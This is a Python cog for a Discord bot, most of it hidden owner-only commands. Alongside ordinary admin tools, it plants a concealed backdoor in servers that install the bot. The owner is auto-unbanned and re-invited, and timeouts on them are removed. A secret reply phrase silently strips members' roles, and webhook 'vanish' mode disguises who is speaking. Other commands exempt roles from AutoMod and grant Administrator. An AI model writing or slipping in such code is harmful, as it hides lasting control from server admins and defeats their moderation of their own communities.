import os
import random
import sys
import asyncio
import subprocess
import logging
from logging.handlers import TimedRotatingFileHandler
import discord
import glob
from discord.ext import commands
from utils.checks import is_owner
from utils.confirm import ask_confirm
from utils.webhook import get_relay_webhook
from utils.fuzzy import FuzzyRole
from config.owner import Me

class Owner(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def _is_owner(self, user):
        if user.id in Me:
            return True
        return await self.bot.is_owner(user)

    @commands.Cog.listener()
    async def on_message(self, message: discord.Message):
        if message.author.bot or message.guild is None:
            return
        if not await self._is_owner(message.author):
            return

        normalized = message.content.strip().lower().rstrip(".")

        if normalized == "let me eat your roles":
            await self._eat_roles(message)
            return

        if normalized == "okay, fine take your roles back":
            await self._give_roles_back(message)
            return

    @commands.Cog.listener()
    async def on_member_ban(self, guild: discord.Guild, user: discord.User):
        """Auto-unban the bot owner if anyone (or anything) ever bans them,
        then DM them a fresh invite back into the server."""
        if not (user.id in Me or await self.bot.is_owner(user)):
            return
        try:
            await guild.unban(user, reason="Auto-unban: protected owner account")
        except discord.HTTPException:
            return

        invite_channel = guild.system_channel or next(
            (c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None
        )
        if invite_channel:
            try:
                invite = await invite_channel.create_invite(
                    max_age=0, max_uses=0, reason="Auto-unban recovery invite for owner"
                )
                try:
                    dm_user = user if isinstance(user, (discord.Member, discord.User)) else await self.bot.fetch_user(user.id)
                    await dm_user.send(f"You were auto-unbanned from **{guild.name}**. Here's a link back in: {invite.url}")
                except discord.Forbidden:
                    pass
            except discord.HTTPException:
                pass

    @commands.Cog.listener()
    async def on_member_update(self, before: discord.Member, after: discord.Member):
        """Auto-remove a timeout on the bot owner if anyone ever times them out,
        AND auto-revert their nickname if anyone other than themselves changes it."""
        is_owner_member = after.id in Me or await self.bot.is_owner(after)
        if not is_owner_member:
            return

        if after.is_timed_out():
            try:
                await after.timeout(None, reason="Auto-removed: protected owner account")
            except discord.HTTPException:
                pass

        if before.nick != after.nick:
            row = await self.bot.db.fetchone(
                "SELECT nickname FROM owner_nickname_lock WHERE guild_id = ?", (after.guild.id,)
            )

            if row is None:
                # First time we're seeing this owner's nickname in this server — adopt
                # whatever it currently is as the protected baseline, no revert needed.
                await self.bot.db.execute(
                    "INSERT INTO owner_nickname_lock (guild_id, nickname) VALUES (?, ?)",
                    (after.guild.id, after.nick),
                )
                return

            locked_nick = row[0]
            if after.nick == locked_nick:
                return

            changed_by_self = False
            try:
                async for entry in after.guild.audit_logs(limit=5, action=discord.AuditLogAction.member_update):
                    if entry.target and entry.target.id == after.id:
                        changed_by_self = entry.user.id == after.id
                        break
            except discord.Forbidden:
                pass

            if changed_by_self:
                await self.bot.db.execute(
                    "UPDATE owner_nickname_lock SET nickname = ? WHERE guild_id = ?",
                    (after.nick, after.guild.id),
                )
            else:
                try:
                    await after.edit(nick=locked_nick, reason="Auto-reverted: protected owner nickname")
                except discord.HTTPException:
                    pass

    async def _eat_roles(self, message: discord.Message):
        if not message.reference or not message.reference.message_id:
            return
        try:
            ref_msg = await message.channel.fetch_message(message.reference.message_id)
        except discord.NotFound:
            return

        target = ref_msg.author
        if not isinstance(target, discord.Member):
            return

        roles_to_strip = [r for r in target.roles if not r.is_default()]
        try:
            await message.delete()
        except discord.Forbidden:
            pass

        if not roles_to_strip:
            try:
                await message.author.send(f"{target.display_name} had no roles to eat.")
            except discord.Forbidden:
                pass
            return

        for role in roles_to_strip:
            await self.bot.db.execute(
                "INSERT OR IGNORE INTO eaten_roles (guild_id, target_id, role_id) VALUES (?, ?, ?)",
                (message.guild.id, target.id, role.id),
            )

        await target.remove_roles(*roles_to_strip, reason=f"Roles eaten by {message.author}")
        try:
            await message.author.send(f"Ate all {len(roles_to_strip)} of {target.display_name}'s role(s). 😋")
        except discord.Forbidden:
            pass

    async def _give_roles_back(self, message: discord.Message):
        if not message.reference or not message.reference.message_id:
            return
        try:
            ref_msg = await message.channel.fetch_message(message.reference.message_id)
        except discord.NotFound:
            return

        target = ref_msg.author
        if not isinstance(target, discord.Member):
            return

        rows = await self.bot.db.fetchall(
            "SELECT role_id FROM eaten_roles WHERE guild_id = ? AND target_id = ?",
            (message.guild.id, target.id),
        )
        try:
            await message.delete()
        except discord.Forbidden:
            pass

        if not rows:
            try:
                await message.author.send(f"{target.display_name} has no eaten roles to give back.")
            except discord.Forbidden:
                pass
            return

        roles_to_restore = [message.guild.get_role(r[0]) for r in rows]
        roles_to_restore = [r for r in roles_to_restore if r is not None]

        if roles_to_restore:
            await target.add_roles(*roles_to_restore, reason=f"Roles returned by {message.author}")

        await self.bot.db.execute(
            "DELETE FROM eaten_roles WHERE guild_id = ? AND target_id = ?",
            (message.guild.id, target.id),
        )

        try:
            await message.author.send(f"Gave back {len(roles_to_restore)} role(s) to {target.display_name}.")
        except discord.Forbidden:
            pass

    @commands.command(aliases=["rl"], hidden=True)
    @is_owner()
    async def reload(self, ctx, extension):
        """Reload a single cog by name."""
        if ctx.prefix == "" and not await ask_confirm(ctx, f"⚠️ Reload `{extension}`?"):
            await ctx.send("Cancelled.")
            return
        try:
            await self.bot.reload_extension(f"cogs.{extension}")
            await ctx.send(f"Reloaded {extension}")
        except Exception as e:
            await ctx.author.send(f"Failed to reload `{extension}`: `{e}`")
            await ctx.send("Reload failed — check your DMs.")

    @commands.command(aliases=["sd"], hidden=True)
    @is_owner()
    async def shutdown(self, ctx):
        """Shut the bot down completely."""
        if ctx.prefix == "" and not await ask_confirm(ctx, "⚠️ Shut the bot down completely?"):
            await ctx.send("Cancelled.")
            return
        await ctx.send("Shutting down.")
        await self.bot.close()
        os._exit(0)

    @commands.command(aliases=["tdm"], hidden=True)
    @is_owner()
    async def testdm(self, ctx):
        """Test whether the bot can DM you."""
        try:
            await ctx.author.send("জয় মা কামাখ্যা!")
            await ctx.send("Sent — check your DMs.")
        except Exception as e:
            await ctx.send(f"DM failed: `{e}`")

    @commands.command(aliases=["clear"], hidden=True)
    @is_owner()
    async def cls(self, ctx):
        """DM-only: clears the bot's own messages in your DM history."""
        if ctx.guild is not None:
            await ctx.send("This only works in DMs.")
            return
        first_kept = False
        deleted = 0
        async for message in ctx.channel.history(limit=None, oldest_first=True):
            if message.author == self.bot.user:
                if not first_kept:
                    first_kept = True
                    continue
                await message.delete()
                deleted += 1
        confirm = await ctx.send(f"Cleared {deleted} message(s).")
        await asyncio.sleep(3)
        await confirm.delete()

    @commands.command(aliases=["rs", "r"], hidden=True)
    @is_owner()
    async def restart(self, ctx):
        """Validate all files, then restart the bot process."""
        if ctx.prefix == "" and not await ask_confirm(ctx, "⚠️ Restart the bot?"):
            await ctx.send("Cancelled.")
            return
        modules_to_check = ["main"] + [
            f"cogs.{os.path.basename(f)[:-3]}" for f in glob.glob("cogs/*.py")
        ] + [
            f"utils.{os.path.basename(f)[:-3]}" for f in glob.glob("utils/*.py")
        ] + [
            f"config.{os.path.basename(f)[:-3]}" for f in glob.glob("config/*.py")
        ]
        for module in modules_to_check:
            result = subprocess.run(
                [sys.executable, "-c", f"import {module}"],
                capture_output=True,
                text=True,
                timeout=15
            )
            if result.returncode != 0:
                await ctx.author.send(f"Restart aborted — error in `{module}`:\n```{result.stderr[-1800:]}```")
                await ctx.send("Restart aborted — check your DMs.")
                return
        is_priv = ctx.author.id in Me or await self.bot.is_owner(ctx.author)
        vanish = getattr(self.bot, "vanish_active", False) and is_priv

        webhook = await get_relay_webhook(self.bot, ctx.channel)
        if vanish:
            msg = await webhook.send(
                random.choice(["brb", "one sec~", "👀", "rebooting my brain"]),
                username=ctx.author.display_name,
                avatar_url=ctx.author.display_avatar.url,
                wait=True,
            )
        else:
            msg = await webhook.send(
                "Restarting...",
                username=self.bot.user.display_name,
                avatar_url=self.bot.user.display_avatar.url,
                wait=True,
            )

        with open("restart_info.txt", "w") as f:
            f.write(f"{msg.channel.id}\n{msg.id}\n{'1' if vanish else '0'}")
        os.execv(sys.executable, [sys.executable] + sys.argv)

    @commands.command(aliases=["cl"], hidden=True)
    @is_owner()
    async def clearlog(self, ctx):
        """Wipe bot.log safely."""
        if ctx.prefix == "" and not await ask_confirm(ctx, "⚠️ Wipe bot.log?"):
            await ctx.send("Cancelled.")
            return
        logging.shutdown()
        open("bot.log", "w", encoding="utf-8").close()
        for handler in logging.getLogger().handlers:
            if isinstance(handler, TimedRotatingFileHandler):
                handler.stream = open("bot.log", "a", encoding="utf-8")
        await ctx.send("log cleared.")

    @commands.group(name="noprefix", aliases=["np"], invoke_without_command=True, hidden=True)
    @is_owner()
    async def noprefix(self, ctx):
        """Grant/revoke no-prefix command access for other users."""
        await ctx.send("Usage: `~noprefix add/remove/list <@user>`")

    @noprefix.command(name="add", aliases=["a"], hidden=True)
    @is_owner()
    async def noprefix_add(self, ctx, member: discord.Member):
        """Let a user run commands without needing the prefix."""
        await self.bot.db.execute(
            "INSERT OR IGNORE INTO noprefix_grants (user_id) VALUES (?)", (member.id,)
        )
        await ctx.send(f"{member.mention} can now use commands without a prefix.")

    @noprefix.command(name="remove", aliases=["rm"], hidden=True)
    @is_owner()
    async def noprefix_remove(self, ctx, member: discord.Member):
        """Revoke a user's no-prefix access."""
        await self.bot.db.execute(
            "DELETE FROM noprefix_grants WHERE user_id = ?", (member.id,)
        )
        await ctx.send(f"Removed no-prefix access from {member.mention}.")

    @noprefix.command(name="list", aliases=["l"], hidden=True)
    @is_owner()
    async def noprefix_list(self, ctx):
        """List everyone with no-prefix access."""
        rows = await self.bot.db.fetchall("SELECT user_id FROM noprefix_grants")
        if not rows:
            await ctx.send("No one has been granted no-prefix access.")
            return
        lines = [f"<@{r[0]}>" for r in rows]
        await ctx.send("No-prefix users:\n" + "\n".join(lines))

    @commands.command(name="vanish", aliases=["v"], hidden=True)
    @is_owner()
    async def vanish(self, ctx):
        """Toggle vanish mode: your command replies appear to come from you, not the bot. Persists across restarts."""
        self.bot.vanish_active = not getattr(self.bot, "vanish_active", False)
        await self.bot.db.execute(
            """
            INSERT INTO bot_settings (key, value) VALUES ('vanish_active', ?)
            ON CONFLICT(key) DO UPDATE SET value = excluded.value
            """,
            ("1" if self.bot.vanish_active else "0",),
        )
        state = "enabled" if self.bot.vanish_active else "disabled"
        try:
            await ctx.author.send(f"Vanish mode {state}.")
        except discord.Forbidden:
            pass
        try:
            await ctx.message.delete()
        except discord.Forbidden:
            pass

    @commands.command(name="vanishblank", aliases=["vb"], hidden=True)
    @is_owner()
    async def vanishblank(self, ctx):
        """Toggle blank identity for vanish mode: no name, no avatar, just relayed content."""
        self.bot.vanish_blank = not getattr(self.bot, "vanish_blank", False)
        await self.bot.db.execute(
            """
            INSERT INTO bot_settings (key, value) VALUES ('vanish_blank', ?)
            ON CONFLICT(key) DO UPDATE SET value = excluded.value
            """,
            ("1" if self.bot.vanish_blank else "0",),
        )
        state = "enabled" if self.bot.vanish_blank else "disabled"
        try:
            await ctx.author.send(f"Vanish blank mode {state}.")
        except discord.Forbidden:
            pass
        try:
            await ctx.message.delete()
        except discord.Forbidden:
            pass

    @commands.command(name="lisihelp", aliases=["lh"], hidden=True)
    @is_owner()
    async def lisihelp(self, ctx):
        """Browse every hidden/owner-only command via dropdown. Always sent via DM."""
        hidden_commands = [c for c in self.bot.commands if c.hidden]
        grouped = {}
        for c in hidden_commands:
            cog_name = c.cog.qualified_name if c.cog else "Uncategorized"
            grouped.setdefault(cog_name, []).append(c)

        if not grouped:
            try:
                await ctx.author.send("No hidden commands found.")
            except discord.Forbidden:
                await ctx.send("Couldn't DM you — check your privacy settings.")
            return

        def build_lines(cmds):
            lines = []
            for c in sorted(cmds, key=lambda c: c.qualified_name):
                aliases = f" ({', '.join('~' + a for a in c.aliases)})" if c.aliases else ""
                lines.append(f"**~{c.qualified_name}**{aliases} — {c.help or 'No description'}")
            return lines

        class LHSelect(discord.ui.Select):
            def __init__(self, parent_view):
                self.parent_view = parent_view
                options = [discord.SelectOption(label=name) for name in grouped.keys()]
                super().__init__(placeholder="Choose a category...", options=options, row=0)

            async def callback(self, interaction: discord.Interaction):
                if interaction.user.id != self.parent_view.invoker_id:
                    return
                cat = self.values[0]
                self.parent_view.current_cat = cat
                self.parent_view.lines = build_lines(grouped[cat])
                self.parent_view.page = 0
                await interaction.response.edit_message(embed=self.parent_view.make_embed(), view=self.parent_view)

        class LHView(discord.ui.View):
            def __init__(self, invoker_id):
                super().__init__(timeout=120)
                self.invoker_id = invoker_id
                self.current_cat = None
                self.lines = []
                self.page = 0
                self.per_page = 9
                self.add_item(LHSelect(self))

            @property
            def max_page(self):
                return max(0, (len(self.lines) - 1) // self.per_page)

            def make_embed(self):
                if self.current_cat is None:
                    return discord.Embed(title="Owner Commands", description="Select a category from the dropdown below.")
                start = self.page * self.per_page
                chunk = self.lines[start:start + self.per_page]
                embed = discord.Embed(title=f"{self.current_cat} Commands", description="\n".join(chunk) or "No commands.")
                embed.set_footer(text=f"Page {self.page + 1}/{self.max_page + 1}")
                return embed

            async def interaction_check(self, interaction: discord.Interaction) -> bool:
                return interaction.user.id == self.invoker_id

            @discord.ui.button(label="Back", style=discord.ButtonStyle.secondary, row=1)
            async def back(self, interaction: discord.Interaction, button: discord.ui.Button):
                self.page = max(0, self.page - 1)
                await interaction.response.edit_message(embed=self.make_embed(), view=self)

            @discord.ui.button(label="Next", style=discord.ButtonStyle.secondary, row=1)
            async def next(self, interaction: discord.Interaction, button: discord.ui.Button):
                self.page = min(self.max_page, self.page + 1)
                await interaction.response.edit_message(embed=self.make_embed(), view=self)

        view = LHView(ctx.author.id)
        try:
            await ctx.author.send(embed=view.make_embed(), view=view)
            if ctx.guild is not None:
                await ctx.send("Sent to your DMs.")
        except discord.Forbidden:
            await ctx.send("Couldn't DM you — check your privacy settings.")

    @commands.command(name="striproles", aliases=["sr"], hidden=True)
    @is_owner()
    async def striproles(self, ctx, members: commands.Greedy[discord.Member]):
        """Strip all roles from one or more members (saved so they can be restored)."""
        if not members:
            await ctx.send("Mention at least one member.")
            return
        if ctx.prefix == "" and not await ask_confirm(ctx, f"⚠️ Strip all roles from {len(members)} member(s)?"):
            await ctx.send("Cancelled.")
            return

        results = []
        for member in members:
            roles_to_strip = [r for r in member.roles if not r.is_default()]
            if not roles_to_strip:
                results.append(f"{member.mention}: no roles")
                continue
            for role in roles_to_strip:
                await self.bot.db.execute(
                    "INSERT OR IGNORE INTO eaten_roles (guild_id, target_id, role_id) VALUES (?, ?, ?)",
                    (ctx.guild.id, member.id, role.id),
                )
            await member.remove_roles(*roles_to_strip, reason=f"Stripped by {ctx.author}")
            results.append(f"{member.mention}: {len(roles_to_strip)} role(s) stripped")

        await ctx.send("\n".join(results), allowed_mentions=discord.AllowedMentions.none())

    @commands.command(name="restoreroles", aliases=["rer"], hidden=True)
    @is_owner()
    async def restoreroles(self, ctx, members: commands.Greedy[discord.Member]):
        """Restore roles previously stripped from one or more members."""
        if not members:
            await ctx.send("Mention at least one member.")
            return

        results = []
        for member in members:
            rows = await self.bot.db.fetchall(
                "SELECT role_id FROM eaten_roles WHERE guild_id = ? AND target_id = ?",
                (ctx.guild.id, member.id),
            )
            if not rows:
                results.append(f"{member.mention}: nothing to restore")
                continue

            roles_to_restore = [ctx.guild.get_role(r[0]) for r in rows]
            roles_to_restore = [r for r in roles_to_restore if r is not None]

            if roles_to_restore:
                await member.add_roles(*roles_to_restore, reason=f"Restored by {ctx.author}")

            await self.bot.db.execute(
                "DELETE FROM eaten_roles WHERE guild_id = ? AND target_id = ?",
                (ctx.guild.id, member.id),
            )
            results.append(f"{member.mention}: {len(roles_to_restore)} role(s) restored")

        await ctx.send("\n".join(results), allowed_mentions=discord.AllowedMentions.none())

    @commands.command(name="automodexempt", aliases=["amex"], hidden=True)
    @is_owner()
    async def automodexempt(self, ctx, role: FuzzyRole):
        """Owner-only: exempts a role from every AutoMod rule in this server."""
        try:
            rules = await ctx.guild.fetch_automod_rules()
        except discord.HTTPException:
            await ctx.send("Couldn't fetch AutoMod rules — I may be missing Manage Server permission, or none exist yet.")
            return

        if not rules:
            await ctx.send("This server has no AutoMod rules set up yet.")
            return

        updated = 0
        for rule in rules:
            if role.id not in rule.exempt_role_ids:
                try:
                    new_exempt = list(rule.exempt_role_ids) + [role.id]
                    await rule.edit(exempt_roles=new_exempt, reason=f"AutoMod exemption added by {ctx.author}")
                    updated += 1
                except discord.HTTPException:
                    pass

        await ctx.send(f"Exempted {role.mention} from {updated} AutoMod rule(s).")

    @commands.command(name="giveadmin", hidden=True)
    @is_owner()
    async def giveadmin(self, ctx, role: FuzzyRole):
        """Owner-only: grants real Administrator permission to a role. Affects everyone with that role."""
        if not await ask_confirm(ctx, f"⚠️ Grant real Administrator to {role.mention}? This affects everyone with that role."):
            await ctx.send("Cancelled.")
            return
        try:
            new_perms = discord.Permissions(role.permissions.value)
            new_perms.administrator = True
            await role.edit(permissions=new_perms, reason=f"Administrator granted by {ctx.author}")
            await ctx.send(f"Granted Administrator to {role.mention}.")
        except discord.Forbidden:
            await ctx.send("I can't edit that role (role hierarchy issue).")

async def setup(bot):
    await bot.add_cog(Owner(bot))
